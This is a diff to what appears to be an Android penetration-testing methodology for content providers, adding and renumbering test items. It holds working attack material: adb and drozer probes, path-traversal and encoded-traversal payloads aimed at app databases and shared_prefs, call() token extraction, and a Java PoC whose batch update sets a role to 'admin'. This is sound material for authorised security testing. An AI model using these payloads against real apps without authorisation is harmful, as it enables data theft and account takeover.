@@ -58,22 +58,27 @@ can the app itself be made to call that method on the attacker's behalf?**
 2. **Test `call()` on every authority, including ones whose `query` was denied.** The framework applies no
    permission check specific to `call()`, and it is addressed by method name rather than URI, so every
    `<path-permission>` and `UriMatcher` guard in the app misses it. Highest reward-per-minute in the domain.
-3. **Decide file-backed vs SQLite-backed per authority before you fuzz.** An exported authority that resolves
+   Then widen it: `openTypedAssetFile`, `getStreamTypes`, `bulkInsert` and `applyBatch` are overrides the
+   CLI cannot reach at all (D07-018, D07-019), so they survive every shell-driven sweep ever run on the app.
+3. **Build the PoC app with `<queries>` before you trust any app-UID negative** (D07-008). A caller
+   targeting SDK 30+ cannot see an undeclared package, and that failure is indistinguishable from a closed
+   provider. Getting this wrong turns findings into ruled-out entries silently, at the start of the day.
+4. **Decide file-backed vs SQLite-backed per authority before you fuzz.** An exported authority that resolves
    but returns nothing to `query` is an `openFile` provider; sending it SQLi payloads wastes an hour.
-4. **Traversal, with `/proc/version` as the canary, before anything sensitive.** Unambiguous positive,
+5. **Traversal, with `/proc/version` as the canary, before anything sensitive.** Unambiguous positive,
    harmless payload, clean PoC. Escalate to `shared_prefs`/`databases` only after the canary lands.
-5. **`selection`, then `projection`, then `sortOrder`, then the write verbs' `selection`.** In that order:
+6. **`selection`, then `projection`, then `sortOrder`, then the write verbs' `selection`.** In that order:
    the error message from the first one hands you the table name, the column count and the provider's own
    paren wrapper, which makes the other three cheap.
-6. **`grantUriPermissions` on every provider, exported or not.** This is the item that decides whether a
+7. **`grantUriPermissions` on every provider, exported or not.** This is the item that decides whether a
    `exported="false"` provider is a true negative or a D08 chain waiting for a redirector.
-7. **The paths XML.** One `cat`, and it sets the blast radius of every grant bug you find later.
-8. **Reverse the inbound direction: `OpenableColumns.DISPLAY_NAME`, `EXTRA_STREAM`, `onActivityResult`.**
+8. **The paths XML.** One `cat`, and it sets the blast radius of every grant bug you find later.
+9. **Reverse the inbound direction: `OpenableColumns.DISPLAY_NAME`, `EXTRA_STREAM`, `onActivityResult`.**
    Slowest to set up (you must ship a hostile provider) and the highest ceiling. Start it early enough that
    the build is ready when you need it.
-9. **Proxying sinks — `getContentResolver()` calls *inside* provider methods, and `Uri.parse(getQueryParameter(...))`.**
+10. **Proxying sinks — `getContentResolver()` calls *inside* provider methods, and `Uri.parse(getQueryParameter(...))`.**
    Rare, and Critical when present.
-10. **Everything else.** Slices, cloud media, persistable-grant retention, authority collisions.
+11. **Everything else.** Slices, cloud media, persistable-grant retention, authority collisions.
 
 ## Items
 
@@ -106,11 +111,11 @@ aapt2 d xmltree target.apk --file AndroidManifest.xml | grep -A8 "E: provider"
 ```
 - **Proof:** A table with one row per authority and a filled value (or an explicit `-`) in all six columns.
   Any row with `exported=true` and every permission column empty is an immediate step-2 candidate.
-- **Escalation:** Feeds D07-005 (three-verb probe) and D07-021 (grants). Authorities belonging to bundled
+- **Escalation:** Feeds D07-005 (three-verb probe) and D07-024 (grants). Authorities belonging to bundled
   SDKs go to D07-003 and -> D18 SDK configuration.
 - **Ruled out when:** Every `<provider>` carries `exported="false"` **and** `grantUriPermissions` is absent
   or `"false"` **and** no `<grant-uri-permission>` child exists — at which point the authority is only
-  reachable through the app's own code (D07-053), which you must then still check.
+  reachable through the app's own code (D07-056), which you must then still check.
 
 ### D07-002 · The targetSdk<17 default-export gate — state it or lose the report
 
@@ -165,7 +170,7 @@ grep -oE 'android:name="[^"]+Provider"' out/AndroidManifest.xml | sed 's/.*="//;
 ```
 - **Proof:** A list of authorities whose implementing class lives outside the app's package namespace,
   each with its own `@xml/*paths*` meta-data resource. Name the SDK in the report — it changes who fixes it.
-- **Escalation:** -> D18 third-party SDK configuration; the SDK's paths XML goes straight to D07-054.
+- **Escalation:** -> D18 third-party SDK configuration; the SDK's paths XML goes straight to D07-057.
 - **Ruled out when:** Every runtime authority maps to a class under the app's own package prefix and the
   `dumpsys` list and the manifest list are identical.
 
@@ -198,7 +203,7 @@ drozer> run scanner.provider.finduris -a com.target.app
   -> `call`.
 - **Ruled out when:** No `addURI` or `content://` string exists for the authority and the provider's
   `query()` returns `null` unconditionally — i.e. it is a stub, or a pure `call()`/`openFile()` provider
-  (in which case go to D07-014 and D07-028, do not record a negative here).
+  (in which case go to D07-015 and D07-031, do not record a negative here).
 
 ### D07-005 · Read, write and `call()` are three separate questions
 
@@ -228,7 +233,7 @@ adb shell content gettype --uri $A/items
 ```
 - **Proof:** Six labelled command outputs. The finding is the pair: a `SecurityException` on one verb and a
   success on another, side by side.
-- **Escalation:** A readable row -> D07-065 (rate by content) -> D15. A successful write -> D07-039 blind
+- **Escalation:** A readable row -> D07-068 (rate by content) -> D15. A successful write -> D07-042 blind
   oracle, or a security-relevant column flip -> D23.
 - **Ruled out when:** All six verbs return `java.lang.SecurityException: Permission Denial: ... requires
   <permission> or ... not exported from uid` from an app UID (not just from `shell`), and
@@ -257,7 +262,7 @@ adb shell content gettype --uri $A/items
 | `SecurityException: Permission Denial: ... not exported from uid` | AMS, export check | Gate held. |
 | `Failed to find provider info for <auth>` / `Unknown authority` | package resolution | You never reached the app at all — often package visibility (targetSdk 30+), not permission. Re-test with `<queries>` declared. |
 | `IllegalArgumentException: Unknown URI/URL content://...` | inside `query()`/`UriMatcher` | **You passed the permission gate.** Wrong path, right authority. Go back to D07-004. |
-| `SQLiteException: unrecognized token` / `no such column` | inside the SQL layer | You passed the gate *and* your string reached SQL. Go to D07-035. |
+| `SQLiteException: unrecognized token` / `no such column` | inside the SQL layer | You passed the gate *and* your string reached SQL. Go to D07-038. |
 | `FileNotFoundException: No files supported by provider at ...` | inside `openFile()` | You passed the gate; it is a cursor provider, not a file provider. |
 | `NullPointerException` from provider frames | inside the provider | Passed the gate; also a D19 crash candidate. |
 
@@ -305,7 +310,53 @@ Log.i("poc", DatabaseUtils.dumpCursorToString(c));
 - **Ruled out when:** The app-UID reproduction throws `SecurityException` while `shell` succeeds. Record it
   as a shell-only artefact, not a finding.
 
-### D07-008 · Sweep authorities with a counted loop, never a bare shell array
+### D07-008 · Declare `<queries>` in the PoC app, or you will manufacture your own false negative
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | n/a (false-negative gate) |
+| **Attacker** | AM-03 |
+| **Applies to** | any PoC/attacker app whose own `targetSdkVersion >= 30`, running on Android 11+ |
+| **Maps to** | package visibility — free below targetSdk 30, filtered at 30+; MASTG-TECH-0148 (the `content` command runs as `shell`) |
+
+- **Test:** Package visibility is filtered for a caller that itself targets SDK 30 or above. An undeclared
+  target package is not merely permission-denied — it is *invisible*, so `getContentResolver().query()`
+  fails at the resolution layer with the same practical appearance as "the provider is closed". This is
+  the mirror image of D07-007: `adb shell` is exempt from package-visibility filtering (which is why the
+  CLI is the right *discovery* tool), so the shell probe and the app probe can disagree for a reason that
+  has nothing to do with the provider's permissions at all. A tester who writes the PoC without
+  `<queries>` records a true finding as a true negative.
+- **How:** Put the target in the PoC's manifest before you write a single line of exploit code. An
+  explicit authority entry is the narrow form and the one to prefer:
+```xml
+<manifest ...>
+  <queries>
+    <provider android:authorities="com.target.app.provider" />
+    <package android:name="com.target.app" />
+  </queries>
+  <!-- no <uses-permission> at all: that is the point of the PoC -->
+</manifest>
+```
+  Then confirm the filtering state at runtime rather than assuming it:
+```bash
+adb shell dumpsys package queries | sed -n '/com.poc.probe/,/^$/p'
+aapt dump badging poc.apk | grep -E 'targetSdkVersion|sdkVersion'
+# capture the exact failure string in both configurations
+adb logcat -c && adb shell am start -n com.poc.probe/.MainActivity && adb logcat -d | grep -i 'poc\|Unknown URL\|Permission Denial'
+```
+- **Proof:** The same URI, the same PoC APK, built twice — once with the `<queries>` block and once
+  without. One resolves and returns rows; the other fails at the resolution layer. Put both outputs in the
+  working notes, and only the `<queries>`-declared run in the report.
+- **Escalation:** This reopens every authority written off on an app-UID probe made before the `<queries>`
+  block existed. Re-run the whole reachability table from D07-005 after fixing the PoC manifest — that
+  single re-run is where a surprising number of "closed" providers turn out to be open.
+- **Ruled out when:** The PoC declares the target authority in `<queries>` (or targets SDK < 30, or holds
+  `QUERY_ALL_PACKAGES`), `dumpsys package queries` confirms the target is visible to it, and the read
+  still fails with an AMS-layer `Permission Denial` naming a permission. Resolution-layer failures
+  (D07-006's third row) are never a valid basis for a negative.
+
+### D07-009 · Sweep authorities with a counted loop, never a bare shell array
 
 | | |
 |---|---|
@@ -345,7 +396,7 @@ assert done == expected, "loop ate probes"
 - **Escalation:** n/a.
 - **Ruled out when:** n/a — this is unconditional. A sweep without a probe count is not evidence of absence.
 
-### D07-009 · Prove the negative with the exact exception text
+### D07-010 · Prove the negative with the exact exception text
 
 | | |
 |---|---|
@@ -369,11 +420,11 @@ done | tee /tmp/provider_negatives.txt
   `com.target.app.sync | query | java.lang.SecurityException: Permission Denial: opening provider
   com.target.app.SyncProvider from ProcessRecord{...} (pid=..., uid=10234) requires
   com.target.app.permission.SYNC`. This pre-empts "did you check the providers?" at delivery.
-- **Escalation:** Re-open every negative the moment you find a grant primitive (D07-021/-022) or a URI sink
-  inside the app (D07-053). A provider negative is conditional on those two being absent.
+- **Escalation:** Re-open every negative the moment you find a grant primitive (D07-024/-022) or a URI sink
+  inside the app (D07-056). A provider negative is conditional on those two being absent.
 - **Ruled out when:** n/a — this *is* the ruled-out procedure.
 
-### D07-010 · Read the provider from a second Android user and from a locked Private Space
+### D07-011 · Read the provider from a second Android user and from a locked Private Space
 
 | | |
 |---|---|
@@ -402,7 +453,7 @@ adb shell content read --uri 'content://com.target.app.fileprovider/files/x' --u
 - **Ruled out when:** The provider is not installed for the secondary user (`pm list packages --user 10`
   does not list it), or `--user 10` returns only that user's own rows with a distinct dataset.
 
-### D07-011 · `readPermission` / `writePermission` asymmetry
+### D07-012 · `readPermission` / `writePermission` asymmetry
 
 | | |
 |---|---|
@@ -425,13 +476,13 @@ adb shell content update --uri content://com.target.app.provider/settings \
 ```
 - **Proof:** `Required Permission - Read: null` alongside a non-null write permission (or the inverse), plus
   the verb that succeeds. Note the framework's own warning applies: a write permission alone is not
-  containment, because `WHERE` clauses in `update`/`delete` confirm data by side effect (D07-039).
+  containment, because `WHERE` clauses in `update`/`delete` confirm data by side effect (D07-042).
 - **Escalation:** A write that flips a security setting (pinning off, device trusted, role elevated) is an
   integrity finding on its own -> D23; a write into a rendered field -> D10 stored XSS in a WebView.
 - **Ruled out when:** A single `android:permission` covers both directions with no differing
-  `readPermission`/`writePermission`, and the protectionLevel check in D07-013 passes.
+  `readPermission`/`writePermission`, and the protectionLevel check in D07-014 passes.
 
-### D07-012 · `android:permission` silently overridden by a weaker per-direction permission
+### D07-013 · `android:permission` silently overridden by a weaker per-direction permission
 
 | | |
 |---|---|
@@ -459,11 +510,11 @@ PY
 ```
 - **Proof:** A row flagged `OVERRIDE`, followed by the verb in the overridden direction succeeding from an
   app UID that does not hold the strong permission.
-- **Escalation:** Combine with D07-019 to find the path variant on which the weak direction is reachable.
+- **Escalation:** Combine with D07-022 to find the path variant on which the weak direction is reachable.
 - **Ruled out when:** No provider declares both `permission` and a differing per-direction attribute, or
-  the per-direction attribute is at least as strong (verify with D07-013, not by name).
+  the per-direction attribute is at least as strong (verify with D07-014, not by name).
 
-### D07-013 · Resolve the protectionLevel of the custom permission that "protects" the provider
+### D07-014 · Resolve the protectionLevel of the custom permission that "protects" the provider
 
 | | |
 |---|---|
@@ -489,12 +540,12 @@ adb shell dumpsys package com.poc.stub | grep -A20 'requested permissions'
 - **Proof:** `protectionLevel=normal` (or `0` in dumpsys) on the guarding permission, followed by the stub
   app holding it after a plain install and reading the provider.
 - **Escalation:** -> D03 for the full permission-matrix work; the provider read then rates on its contents
-  (D07-065).
+  (D07-068).
 - **Ruled out when:** `dumpsys package` shows `protectionLevel: signature` on every permission named by the
   provider's `permission`/`readPermission`/`writePermission`/`<path-permission>` attributes, **and** the app
   is not part of a shared-signature family whose other members an attacker could reach (D18).
 
-### D07-014 · `call()` is gated by neither the read nor the write permission
+### D07-015 · `call()` is gated by neither the read nor the write permission
 
 | | |
 |---|---|
@@ -522,12 +573,12 @@ drozer> run app.provider.call content://com.target.app.provider \
 - **Proof:** `Result: Bundle[{token=eyJ...}]` printed by `content call`, or `Done.` from drozer plus the
   observable side effect. A returned Bundle from an app UID holding no permissions is the whole finding.
 - **Escalation:** A token-returning method -> D13/D15 account takeover. A setter -> D23 entitlement grant.
-  A dump method -> D07-062 side effects.
+  A dump method -> D07-065 side effects.
 - **Ruled out when:** The provider does not override `call()` (`grep -rn 'public Bundle call(' out/sources/`
   returns nothing for that class and its superclasses), or every branch of the `call()` switch starts with
   an enforced `getCallingPackage()`/`checkCallingPermission()` gate whose failure path throws.
 
-### D07-015 · `call()` bypasses `UriMatcher` and `<path-permission>` by design
+### D07-016 · `call()` bypasses `UriMatcher` and `<path-permission>` by design
 
 | | |
 |---|---|
@@ -558,18 +609,18 @@ adb shell content call --uri content://com.target.app.provider --method readKeys
 - **Ruled out when:** `call()` is not overridden, or it delegates to the same `UriMatcher`-driven
   authorisation used by the CRUD methods and you have shown the denial path executing.
 
-### D07-016 · Enumerate the `call()` method table out of the DEX
+### D07-017 · Enumerate the `call()` method table out of the DEX
 
 | | |
 |---|---|
 | **Severity ceiling** | Support |
-| **VRT** | n/a (enabler for D07-014) |
+| **VRT** | n/a (enabler for D07-015) |
 | **Attacker** | AM-03 |
 | **Applies to** | all providers overriding `call()` |
 | **Maps to** | drozer `app.provider.call`; MASTG-TECH-0148 |
 
 - **Test:** `call()` method names are never in the manifest and rarely in a string resource you would
-  notice. They live in the switch inside `call()`. Without them, D07-014 degrades to guessing.
+  notice. They live in the switch inside `call()`. Without them, D07-015 degrades to guessing.
 - **How:**
 ```bash
 # the switch arms, scoped to the call() body
@@ -581,11 +632,112 @@ jadx-gui out/target.apk   # navigate to the provider class, read call() top to b
 ```
   Then drive each name with a probe bundle and record which ones do not throw.
 - **Proof:** The extracted method-name list plus the per-method result (`Bundle[{...}]`, `Bundle[{}]`,
-  exception). A method returning a non-empty Bundle to an unprivileged caller goes to D07-014.
-- **Escalation:** -> D07-014, D07-062.
+  exception). A method returning a non-empty Bundle to an unprivileged caller goes to D07-015.
+- **Escalation:** -> D07-015, D07-065.
 - **Ruled out when:** The `call()` body is a single `return super.call(...)` or `return null`.
 
-### D07-017 · `<path-permission>` form coverage — the five path attributes
+### D07-018 · Inventory the whole Binder entry-point surface, not the eight verbs the CLI exposes
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) for the access; `server_side_injection.file_inclusion.local` (P1) where `openTypedAssetFile` yields file bytes |
+| **Attacker** | AM-03 |
+| **Applies to** | all; probe from a PoC app, because `adb shell content` cannot reach most of these |
+| **Maps to** | QARK `INSECURE_FUNCTIONS_NAMES = ("call",)` — "The framework does no permission checking on this entry into the content provider besides the basic ability for the application to get access to the provider at all" — generalised to the rest of the overridable surface; MASTG-TECH-0148 |
+
+- **Test:** `adb shell content` gives you `query`, `insert`, `update`, `delete`, `call`, `read`, `write`
+  and `gettype`. `ContentProvider` exposes more overridable methods than that across Binder, and every
+  override is a separate piece of the app's code that another process can execute: `getType`,
+  `getStreamTypes`, `openTypedAssetFile`, `bulkInsert`, `applyBatch`, `refresh`,
+  `canonicalize`/`uncanonicalize` and `checkUriPermission`. `call()` is the famous case (D07-015) and it
+  is not the only one. Do not assume the provider-level permission covers the whole surface — determine it
+  **empirically, per method**, because the answer depends on the platform version and on what the override
+  itself does before it reaches the data.
+- **How:** Enumerate what the app actually overrides, then probe each override from a PoC app:
+```bash
+grep -rnE 'public [A-Za-z<>\[\]]+ (getType|getTypeAnonymous|getStreamTypes|openTypedAssetFile|bulkInsert|applyBatch|refresh|canonicalize|uncanonicalize|checkUriPermission)\(' jadx_out/sources/
+# an override that is NOT in this list is the framework's base implementation - note that and move on
+```
+```java
+ContentResolver cr = getContentResolver();
+Uri u = Uri.parse("content://com.target.app.provider/items");
+try { Log.i("poc","getType="      + cr.getType(u)); }                                   catch (Throwable t){ Log.i("poc","getType "+t); }
+try { Log.i("poc","streamTypes="  + Arrays.toString(cr.getStreamTypes(u,"*/*"))); }     catch (Throwable t){ Log.i("poc","streamTypes "+t); }
+try { Log.i("poc","typedAsset="   + cr.openTypedAssetFileDescriptor(u,"*/*",null)); }   catch (Throwable t){ Log.i("poc","typedAsset "+t); }
+try { Log.i("poc","canonical="    + cr.canonicalize(u)); }                              catch (Throwable t){ Log.i("poc","canonical "+t); }
+try { Log.i("poc","refresh="      + cr.refresh(u,null,null)); }                         catch (Throwable t){ Log.i("poc","refresh "+t); }
+```
+  Record each result — success, `SecurityException`, `UnsupportedOperationException`, null — in the same
+  per-authority table you built for D07-005, and classify the exception by layer with D07-006.
+- **Proof:** A method that executes the provider's own code — a non-null MIME string, a stream-type array,
+  a file descriptor, a canonicalised URI — returned for a caller whose `query()` on the *same* URI is
+  denied. The pair of outputs side by side is the finding, and it has exactly the shape triage already
+  accepts for `call()`.
+- **Escalation:** `openTypedAssetFile` is the highest-value of these: it hands back a *file* handle through
+  a MIME-negotiation path that an `openFile`-focused traversal review skips entirely — take any hit
+  straight into D07-028 and the encoding matrix in D07-032. A `getType` that performs a database
+  lookup is an existence oracle over the provider's row space; iterate ids and keep the ones whose answer
+  differs from the miss case (D07-053), then take the ids off-device to D15.
+- **Ruled out when:** The DEX contains no override for any of these methods — the framework's base
+  implementations return null, throw `UnsupportedOperationException`, or loop the CRUD verbs you have
+  already tested, so there is no additional app code behind them — **or** every override throws the same
+  AMS-layer `Permission Denial` as `query()` from an app UID with `<queries>` declared. Quote the grep
+  output showing the absent overrides; "I only ran `adb shell content`" is not a negative for this item,
+  because the CLI cannot reach most of this surface.
+
+### D07-019 · `applyBatch()` and `bulkInsert()` — the write sinks `adb shell content` cannot reach
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) where the batch flips a security-relevant column; `broken_access_control.exposed_sensitive_android_intent` (VARIES) otherwise |
+| **Attacker** | AM-03 |
+| **Applies to** | providers that override `bulkInsert()` or `applyBatch()`; requires a PoC app — the CLI has no batch verb |
+| **Maps to** | MASTG-TECH-0148 (the CLI's verb set), MASWE-0018; the "batch operations are atomic and consistent" checklist line that no public methodology actually tests |
+
+- **Test:** The `content` CLI has no batch verb, so an override of `bulkInsert()` or `applyBatch()` is a
+  write path that every shell-driven sweep in this chapter misses by construction. Two distinct bugs live
+  there. First, an override routinely hand-rolls its own transaction and SQL handling — a **second,
+  un-reviewed copy** of the concatenation you already tested in `insert()`/`update()`. Second,
+  `applyBatch()` takes an `ArrayList<ContentProviderOperation>` in which *each operation carries its own
+  URI, values, selection and selectionArgs*; a provider that validates "the" URI once on entry and then
+  loops the operations can be handed a batch whose later operations point somewhere else entirely.
+- **How:** Confirm the overrides exist, then build a batch whose operations disagree with each other:
+```bash
+grep -rnA30 'public int bulkInsert(\|public ContentProviderResult\[\] applyBatch(' jadx_out/sources/
+grep -rn 'beginTransaction\|setTransactionSuccessful\|yieldIfContendedSafely' jadx_out/sources/ | grep -i 'provider'
+```
+```java
+ArrayList<ContentProviderOperation> ops = new ArrayList<>();
+// operation 0: the path the provider expects to be asked about
+ops.add(ContentProviderOperation.newInsert(Uri.parse("content://com.target.app.provider/public"))
+        .withValue("name","probe7x2k9qd").build());
+// operation 1: a different path, and a selection that is a separate injection sink
+ops.add(ContentProviderOperation.newUpdate(Uri.parse("content://com.target.app.provider/account"))
+        .withSelection("1=1", null).withValue("role","admin").build());
+ContentProviderResult[] r = getContentResolver().applyBatch("com.target.app.provider", ops);
+Log.i("poc", Arrays.toString(r));   // per-operation results: which ones actually applied?
+
+ContentValues a = new ContentValues(); a.put("name","probe7x2k9qd");
+int n = getContentResolver().bulkInsert(Uri.parse("content://com.target.app.provider/items"),
+                                        new ContentValues[]{a, a});
+Log.i("poc","bulkInsert rows=" + n);
+```
+- **Proof:** A follow-up `content query` showing the row written by the batch's **second** operation, on a
+  path whose stand-alone `content update` was denied — or `bulkInsert` accepting a `ContentValues` that
+  single-row `insert` rejects, which proves the two paths validate differently. Report the
+  `ContentProviderResult[]` array: it tells the triager exactly which operations applied.
+- **Escalation:** The per-operation `withSelection` string is an injection sink in its own right — take a
+  hit to D07-042 and run the blind boolean oracle through the batch path. A flipped entitlement or role
+  column goes to D23; a poisoned row that the app later renders goes to D10.
+- **Ruled out when:** Neither method is overridden in the DEX. The base `ContentProvider.bulkInsert()`
+  loops `insert()` and the base `applyBatch()` applies each operation through the same
+  `insert`/`update`/`delete` you have already tested, so the permission and validation behaviour is
+  identical by construction and there is no second code path to attack. Quote the absence of both
+  overrides from the grep above — do **not** record a negative on the basis that the CLI had no batch verb.
+
+### D07-020 · `<path-permission>` form coverage — the five path attributes
 
 | | |
 |---|---|
@@ -612,12 +764,12 @@ adb shell content query --uri content://com.target.app.provider/Protected       
   Remember `UriMatcher` `#` is digits-only and `*` is any segment — a `path-permission` written for
   `/items/#` does not cover `/items/abc` if the matcher routes both.
 - **Proof:** The protected form denied and an unmatched-but-served form returning rows, printed side by side.
-- **Escalation:** Full provider read; then D07-019 for the normalisation variants of the same idea.
+- **Escalation:** Full provider read; then D07-022 for the normalisation variants of the same idea.
 - **Ruled out when:** A provider-level `permission` (or per-direction pair) covers everything the
   `<path-permission>` elements do not, so an unmatched path still hits a check — demonstrate the denial on
   a deliberately unmatched path.
 
-### D07-018 · `/Keys` versus `/Keys/` — the trailing-slash path-permission bypass
+### D07-021 · `/Keys` versus `/Keys/` — the trailing-slash path-permission bypass
 
 | | |
 |---|---|
@@ -646,9 +798,9 @@ Keys/  -> Row: 0 Password=1234567890AZERTYUIOPazertyuiop, pin=1234
   (`content update --bind password:s:...`). That single extra command is the difference between a Medium
   information disclosure and a Critical account takeover.
 - **Ruled out when:** Both forms return the same `Permission Denial`, and the same is true for the other
-  variants in D07-019. One form tested is not a test.
+  variants in D07-022. One form tested is not a test.
 
-### D07-019 · `UriMatcher` normalisation variant fuzz
+### D07-022 · `UriMatcher` normalisation variant fuzz
 
 | | |
 |---|---|
@@ -674,13 +826,13 @@ for v in keys "keys/" "keys//" "keys/////" "keys/1" KEYS "keys/x" "./keys" "keys
   adb shell content query --uri "content://com.target.app.provider/$v" 2>&1 | head -1
 done
 ```
-  Use the Python harness in D07-008 for anything wider than this; count the probes.
+  Use the Python harness in D07-009 for anything wider than this; count the probes.
 - **Proof:** One variant returning rows while the canonical path returns `Permission Denial`. Paste both.
 - **Escalation:** Escalate read -> write through the permissive variant; that is the Critical.
 - **Ruled out when:** Every variant returns the same AMS-layer denial, from an app UID, with the probe count
   matching the variant count.
 
-### D07-020 · `getCallingPackage()` versus `getCallingPackageUnchecked()`
+### D07-023 · `getCallingPackage()` versus `getCallingPackageUnchecked()`
 
 | | |
 |---|---|
@@ -704,12 +856,12 @@ grep -rn -B4 -A20 'getCallingPackageUnchecked' out/sources/
   (an extra, an attribution tag, a `call()` bundle key).
 - **Proof:** The decompiled authorisation branch keyed on the unchecked variant, plus the privileged branch
   taken by your stub — show the data the branch returns.
-- **Escalation:** Provider authorisation bypass; combine with D07-014 for the `call()` surface.
+- **Escalation:** Provider authorisation bypass; combine with D07-015 for the `call()` surface.
 - **Ruled out when:** Every identity decision is made on `Binder.getCallingUid()` or on
   `getCallingPackage()` whose result is then checked against a signature (`PackageManager.checkSignatures`
   / `GET_SIGNING_CERTIFICATES`), and no package name arrives in caller-controlled data.
 
-### D07-021 · `grantUriPermissions="true"` with no `<grant-uri-permission>` restriction
+### D07-024 · `grantUriPermissions="true"` with no `<grant-uri-permission>` restriction
 
 | | |
 |---|---|
@@ -731,13 +883,13 @@ adb shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p
 ```
 - **Proof:** `dumpsys activity permissions` listing a live grant to your PoC package for a URI outside the
   intended scope, plus a successful `content read` on it.
-- **Escalation:** -> D08 intent redirection is the delivery vehicle; the paths XML (D07-054) sets the blast
-  radius. File the grant-config observation as the primitive and the redirection as the consumer (D07-074).
+- **Escalation:** -> D08 intent redirection is the delivery vehicle; the paths XML (D07-057) sets the blast
+  radius. File the grant-config observation as the primitive and the redirection as the consumer (D07-076).
 - **Ruled out when:** `grantUriPermissions="false"` (or absent) and no `<grant-uri-permission>` child exists
   — then grants are impossible for that authority and the provider's declared permissions are the whole
   story.
 
-### D07-022 · `exported="false"` plus `grantUriPermissions="true"` is reachable, not closed
+### D07-025 · `exported="false"` plus `grantUriPermissions="true"` is reachable, not closed
 
 | | |
 |---|---|
@@ -761,11 +913,11 @@ grep -rnE 'setResult\(|startActivity\(.*getIntent|startActivityForResult\(.*getP
   flags set and a `data` URI under the non-exported authority.
 - **Proof:** `openInputStream()` on the non-exported authority succeeding in your PoC after the round trip,
   where the same call before the round trip threw `SecurityException`. Both calls in one logcat capture.
-- **Escalation:** -> D08 for the redirector; -> D07-054 for what the grant then reaches.
+- **Escalation:** -> D08 for the redirector; -> D07-057 for what the grant then reaches.
 - **Ruled out when:** `grantUriPermissions` is false/absent on that authority **and** no component forwards
   an attacker Intent **and** no `PendingIntent` is handed out with a mutable base Intent.
 
-### D07-023 · `FLAG_GRANT_PREFIX_URI_PERMISSION` grants the subtree, not the file
+### D07-026 · `FLAG_GRANT_PREFIX_URI_PERMISSION` grants the subtree, not the file
 
 | | |
 |---|---|
@@ -788,12 +940,12 @@ adb shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p
 ```
 - **Proof:** Bytes returned for a sibling URI you were never explicitly granted, with `dumpsys` showing a
   single prefix grant as the source.
-- **Escalation:** The wider the prefix, the closer it gets to D07-054 arbitrary read. Combine with an
+- **Escalation:** The wider the prefix, the closer it gets to D07-057 arbitrary read. Combine with an
   implicit chooser recipient (D05) and the grant reaches an arbitrary installed app.
 - **Ruled out when:** Grants are issued per-URI with no prefix flag, and a sibling probe returns
   `SecurityException` while the granted URI reads.
 
-### D07-024 · Persistable grants survive reboot and the user's "delete"
+### D07-027 · Persistable grants survive reboot and the user's "delete"
 
 | | |
 |---|---|
@@ -825,7 +977,7 @@ adb shell dumpsys activity providers | sed -n '/Granted Uri Permissions/,/^$/p'
 - **Ruled out when:** The app never sets the persistable flag, or it calls `revokeUriPermission` on delete
   and your post-delete read throws `SecurityException`.
 
-### D07-025 · `openFile()` / `openAssetFile()` / `openTypedAssetFile()` path traversal
+### D07-028 · `openFile()` / `openAssetFile()` / `openTypedAssetFile()` path traversal
 
 | | |
 |---|---|
@@ -861,13 +1013,13 @@ getContentResolver().openInputStream(Uri.parse(
   triager can see it is the real file, and contrast an identical direct `open()` from your UID failing with
   `EACCES`.
 - **Escalation:** -> D11 for what the file holds, -> D13/D15 for the token. If the mode string permits `w`,
-  go to D07-032 and then -> D17 code execution.
+  go to D07-035 and then -> D17 code execution.
 - **Ruled out when:** The provider extends AndroidX `FileProvider` unmodified (it canonicalises and throws
   `IllegalArgumentException: Failed to find configured root that contains ...`), **or** the custom
   implementation calls `getCanonicalPath()` and compares with `startsWith(root.getCanonicalPath())` before
   opening — show the decompiled check, and show your `../` probe hitting it.
 
-### D07-026 · The `%2F` decode mismatch — `Uri` accessors decode after the string check
+### D07-029 · The `%2F` decode mismatch — `Uri` accessors decode after the string check
 
 | | |
 |---|---|
@@ -896,17 +1048,17 @@ adb shell content read --uri 'content://com.target.app.provider/..%2Fdatabases%2
 - **Proof:** The encoded form returning file content while the plain `../` form is rejected. Both outputs
   together; that differential is the finding, not just the read.
 - **Escalation:** The same decode-order mistake recurs in deep-link and intent-redirection URI validation
-  -> D08, D09. With `mode="w"` -> D07-032 -> D17.
+  -> D08, D09. With `mode="w"` -> D07-035 -> D17.
 - **Ruled out when:** The provider uses `getEncodedPath()`/`getEncodedLastPathSegment()` and validates before
   decoding, or canonicalises after decoding — and both the plain and encoded probes are rejected with the
   same exception.
 
-### D07-027 · Depth sweep with harmless canaries before you touch real data
+### D07-030 · Depth sweep with harmless canaries before you touch real data
 
 | | |
 |---|---|
-| **Severity ceiling** | Support (Critical once pivoted) |
-| **VRT** | n/a (technique) |
+| **Severity ceiling** | Support |
+| **VRT** | n/a (technique — the canary alone is never the report; the pivot lands on D07-028) |
 | **Attacker** | AM-03 |
 | **Applies to** | all file-backed providers |
 | **Maps to** | drozer `scanner.provider.traversal`, `app.provider.read` |
@@ -931,10 +1083,10 @@ adb shell content read --uri "content://com.target.app.provider/../../../data/da
 - **Escalation:** Pivot the same depth to `shared_prefs/*.xml` and `databases/*.db` — that pivot is what
   makes it a report rather than a curiosity.
 - **Ruled out when:** All eight depths and both encodings return `FileNotFoundException` or
-  `IllegalArgumentException: Failed to find configured root`, and the canonicalisation check from D07-025
+  `IllegalArgumentException: Failed to find configured root`, and the canonicalisation check from D07-028
   is present in the decompiled source.
 
-### D07-028 · Infer file-backed versus SQLite-backed before you fuzz
+### D07-031 · Infer file-backed versus SQLite-backed before you fuzz
 
 | | |
 |---|---|
@@ -957,17 +1109,17 @@ grep -rn 'public Cursor query(\|public ParcelFileDescriptor openFile(\|extends F
 
 | Signature | Classification | Go to |
 |---|---|---|
-| `query` returns rows or an SQLite error | SQLite-backed | D07-035 |
-| `query` returns `null`/empty, `read` returns bytes or `FileNotFoundException` naming a path | file-backed | D07-025 |
-| `java.io.FileNotFoundException: No files supported by provider at ...` | cursor-only | D07-035, not traversal |
-| class extends `DocumentsProvider` | SAF | D07-061 |
-| class extends `SliceProvider` | Slice | D07-063 |
+| `query` returns rows or an SQLite error | SQLite-backed | D07-038 |
+| `query` returns `null`/empty, `read` returns bytes or `FileNotFoundException` naming a path | file-backed | D07-028 |
